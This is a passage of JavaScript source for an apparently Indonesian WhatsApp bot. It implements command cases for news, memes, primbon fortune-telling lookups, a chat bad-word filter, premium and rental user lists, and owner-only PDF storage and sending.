teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'jalantikus-meme': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
hinata.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
}break
//=================================================//
case 'artinama': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} ${global.author}`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} ${global.author}, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} ${global.author}|Rina`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
hinata.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}break
//=================================================//
case 'rejeki': case 'rezeki': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'sifatusaha': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!ext) return reply(`📌Contoh : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}break
//=================================================//
case 'pekerjaan': case 'kerja': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'artitarot': case 'tarot': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}break
//=================================================//
case 'harisangar': case 'taliwangke': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'haribaik': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'fengshui': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} ${botname}, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}break
//=================================================//
case 'nagahari': case 'harinaga': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'harinaas': case 'harisial': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}break
//=================================================//
case 'weton': case 'wetonjawa': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}break
//=================================================//
case 'peruntungan': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} ${botname}, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'sifat': case 'karakter': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} ${botname}, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}break
//=================================================//
case 'keberuntungan': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} ${botname}, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}break
//=================================================//
case 'memancing': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'masasubur': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'zodiak': case 'zodiac': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix+ command} 1998, 7, 28`)
let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return m.reply(anu.message)
 hinata.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================//
case 'shio': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} ${botname}, 7, 7, 2005, Rina, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
hinata.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}break
//=================================================
case 'addbadword': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return reply(`Masukan Kata Yang Ingin Di Tambahkan Ke Dalam Daftar Kata-Kata Terlarang`)
if (BadHinata.includes(q)) return m.reply(`Kata Ini sudah Ada`)
BadHinata.push(q)
fs.writeFileSync('./HinataBase/database/bad.json', JSON.stringify(BadHinata, null, 2))
m.reply(`📄Sukses Menambahkan Kata Terlarang\n\n📌Periksa dengan mengetik ${prefix}listbadword`)
}break
//=================================================
case 'delbadword': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return reply(`Masukkan Kata Terlarang Yg Ingin Di Hapus`)
if (!BadHinata.includes(q)) return m.reply(`📄Kata Ini Tidak Ada Dalam Database Kata Terlarang\n\n📌Periksa dengan mengetik ${prefix}listbadword`)
let wanu = BadHinata.indexOf(q)
BadHinata.splice(wanu, 1)
fs.writeFileSync('./HinataBase/database/bad.json', JSON.stringify(BadHinata, null, 2))
m.reply(`Berhasil Menghapus Kata-Kata Terlarang ${q}`)
}break
//=================================================
case 'listbadword': case 'larangan': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
teks = `Haii 👋 ${pushname}, Perkenalkan Saya Adalah ${global.botname}\n`
teks += `Di Bawah Ini Adalah Daftar Kata Terlarang Untuk Grup Ini!\n\n`
for (let x of BadHinata) {
teks += `⭔ ${x}\n`
}
teks += `\n*Jumlah* : ${BadHinata.length}`
reply(teks)
}break
//=================================================//
case 'addprem': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!args[0]) return reply(`📄Cara Menggunakan ${prefix+command} Nomor Yang Ingin Di Tambahkan Ke Daftar Premium\n\n📌Contoh : ${prefix+command} ${global.ownernumber}`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknye = await hinata.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(bnnd)
fs.writeFileSync('./HinataBase/database/premium.json', JSON.stringify(prem, null, 2))
m.reply(`Nomor ${bnnd} Telah Di Tambahkan Ke Daftar Premium!!!`)
}break
//=================================================//
case 'delprem': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!args[0]) return reply(`📄Cara Menggunakan ${prefix+command} Nomor Yang Ingin Di Tambahkan Ke Daftar Premium\n\n📌Contoh : ${prefix+command} ${global.ownernumber}`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(yaki)
prem.splice(unp, 1)
fs.writeFileSync('./HinataBase/database/premium.json', JSON.stringify(prem, null, 2))
m.reply(`Nomor ${yaki} Telah Di Hapus Dari Dafter Premium!!!`)
}break
//=================================================//
case 'listprem': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
teksooo = '*Daftar Pengguna Premium*\n\n'
for (let i of prem) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${prem.length}*`
hinata.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": prem } })
}break
//=================================================//
case 'addsewa': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281xxx`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let sewanye = await hinata.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (sewanye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
sewa.push(bnnd)
fs.writeFileSync('./HinataBase/database/sewa.json', JSON.stringify(sewa, null, 2))
m.reply(`Nomor ${bnnd} Telah Di Tambahkan Ke Daftar Sewa Bot!!!`)
}break
//=================================================//
case 'delsewa': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281xxx`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = sewa.indexOf(yaki)
sewa.splice(unp, 1)
fs.writeFileSync('./HinataBase/database/sewa.json', JSON.stringify(sewa, null, 2))
m.reply(`Nomor ${yaki} Daftar Sewa Anda Telah Berakhir!!!`)
}break
//=================================================//
case 'listsewa': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
teksooo = '*List Sewa Bot*\n\n'
for (let i of sewa) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${sewa.length}*`
hinata.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": sewa } })
}break
//=================================================//
case 'addseler': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!args[0]) return reply(`📄Cara Menggunakan ${prefix+command} Nomor Yang Ingin Di Tambahkan Ke Daftar Penjual\n\n📌Contoh : ${prefix+command} ${global.ownernumber}`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknye = await hinata.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
seller.push(bnnd)
fs.writeFileSync('./HinataBase/database/seller.json', JSON.stringify(seller, null, 2))
m.reply(`Nomor ${bnnd} Telah Di Tambahkan Ke Daftar Penjual!!!`)
}break
//=================================================//
case 'delseler': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!args[0]) return reply(`📄Cara Menggunakan ${prefix+command} Nomor Yang Ingin Di Tambahkan Ke Daftar Penjual\n\n📌Contoh : ${prefix+command} ${global.ownernumber}`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = seller.indexOf(yaki)
seller.splice(unp, 1)
fs.writeFileSync('./HinataBase/database/seller.json', JSON.stringify(seller, null, 2))
m.reply(`Nomor ${yaki} Telah Di Hapus Dari Dafter Penjual!!!`)
}break
//=================================================//
case 'listseler': case 'seler': case 'seller': case 'penjual': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
teksooo = '*Daftar Penjual*\n\n'
for (let i of seller) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${seller.length}*`
hinata.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": seller } })
}break
//=================================================//
case 'starthinatabot': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (m.isGroup) return hinatareplypribadi()
if (!isSewa) return reply('*Maaf Anda Belum Menyelesaikan Mode Pembayaran Untuk Sewa Bot*')
rentfromhinata(hinata, m, from)
}break
//=================================================//
case 'sewabot': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix+command} 1 Minggu`)
textt = `sewabot ${text}`
teks1 = `\n\nPenyewa : @${m.sender.split("@")[0]}`
teks2 = `\n\nHalo ${pushname}, ${hinataytimewisher}\nPermintaan Anda telah di kirim ke Owner Bot Kami.\nHarap tunggu...`
for (let i of owner) {
hinata.sendMessage(i + '@s.whatsapp.net', {text: textt + teks1}
)}
hinata.sendMessage(m.chat, {text: textt + teks2 + teks1})
}break
//=================================================//
case 'setcmd': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!m.quoted) return m.reply('Reply Pesan!')
if (!m.quoted.fileSha256) return m.reply('SHA256 Hash Missing')
if (!text) return m.reply(`Untuk Command Apa?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return m.reply('You have no permission to change this sticker command')
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}break
//=================================================//
case 'delcmd': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!m.quoted) return m.reply('Reply Pesan!')
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return m.reply(`Tidak ada hash`)
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return m.reply('You have no permission to delete this sticker command')
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}break
//=================================================//
case 'setppbot': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!quoted) return reply(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
var medis = await hinata.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await hinata.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Berhasil ✅`)
} else {
var memeg = await hinata.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Berhasil ✅`)
}
}
break
//=================================================//
case 'addpdf':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return reply('Nama Pdf Nya Apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return m.reply("Nama tersebut sudah di gunakan")
let delb = await hinata.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./HinataBase/database/Docu/${teks}.pdf`)
fs.writeFileSync('./HinataBase/database/docu.json', JSON.stringify(docunye, null, 2))
fs.unlinkSync(delb)
m.reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}break
//=================================================//
case 'delpdf':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return m.reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return m.reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./HinataBase/database/docu.json', JSON.stringify(docunye, null, 2))
fs.unlinkSync(`./HinataBase/database/Docu/${teks}.pdf`)
m.reply(`Sukses delete pdf ${teks}`)
}
}break
//=================================================//
case 'listpdf': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf Nama File + sambil reply pesan target* \n\n Contoh 2 : yopdf Nama File`
reply(teksoooo)
}break
//=================================================//
case 'yopdf': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let teks = `${text}`
{
hinata.sendMessage(from, { document: fs.readFileSync(`./HinataBase/database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}break
//=================================================//
case 'sendpdf': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
hinata.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./HinataBase/database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}break
//=================================================//
